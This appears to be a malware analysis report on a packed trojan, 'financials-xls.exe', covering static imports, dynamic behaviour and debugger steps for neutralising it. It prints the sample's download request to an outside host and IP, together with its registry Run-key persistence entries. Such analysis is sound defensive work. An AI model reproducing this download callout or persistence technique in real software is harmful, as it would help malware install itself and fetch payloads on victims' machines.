=========Malware (3)==========
Type: Trojan
Name: financials-xls.exe
Analysis Result:
1. Static:
- Using ExeInfoPE:
  - Packer Type: UPX
  - Upack Command: unpack "upx.exe -d"
- Using PEStudio:
  1. Indicators: Signature > Installer VISE Custom
  2. Flagged Section (from here on will be added marked (x)) : 
    2.1 Libraries: WSOCK32.dll (x) == performing TCP/IP Network Communications
                   ADVAPI32.dll == API used on registry calls
                   KERNEL32.dll == Operating system modules
                   USER32.dll == User Interface Libraries
                   COMCTL32.dll == Control Libraries
                   ole.dll == Embeding Excel Spreadsheet
                   SHELL32.dll == Functions to open Web Pages and Files

   2.2 Imports:    GetDesktopWindow (x)
                   RegDeleteKeyA (x)
                   RegSetValueA (x)
                   RegDeleteValueA (x)
                   RegCreateKeyExA (x)
                   17 (recvfrom) (x) 
                   4 (connect) (x)
                   23 (socket) (x)
                   115 (WSAStartup) (x)
                   10 (inet_addr) (x)
                   9 (htons) (x)
                   20 (sendto) (x)
                   WriteFile (x)
                   DeleteFileA (x)
                   GetEnvirontmentStringsW (x)
                   GetEnvirontmentStrings (x)
                   TerminateProcess (x)
                   WinExec (x)
                  

  3. Payloads/Suspicious Functions can be seen in Dynamic Analysis that it creates a new proccess cmd.exe and then WSCRIPT.exe where it is needed to run the .vbs
     scipts to show pop ups (spam popups). Files exported from Procmon to be used in ProcDOT is attached on the name Log Shutup.csv.
     (x) WriteFile C:\Users\malware research\AppData\Roaming\Install.dat
     (x) WSOCK32.dll used to connect and download file from 69.50.175.181
     (x) GET /download.php?advid=00000717&u=%u HTTP/1.0\r\nHost: download.bravesentry.com
     (x) RegSetValue HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows update loader, HKCU\SOFTWARE\Install\Version, HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\con
     (x) run C:\\Program Files\\BraveSentry\\BraveSentry.exe if available

  4. Ways to Immobilize:
      - BP VirtualAlloc (Set Breakpoints to Virtual Alloc where memory starts to be prepared before functions are operated.
      - Step Over to run functions one by one / step by step.
      - Watch Differences in RAX Value that indicates a return value after a functions has been running.
      - Change Operations Right After a return value has been changed to NOP (No Operations) by pressing Space on X64dbg/X32dbg.
      - NOP Functions that do (GET /download.php?advid=00000717&u=%u HTTP/1.0\r\nHost: download.bravesentry.com) 
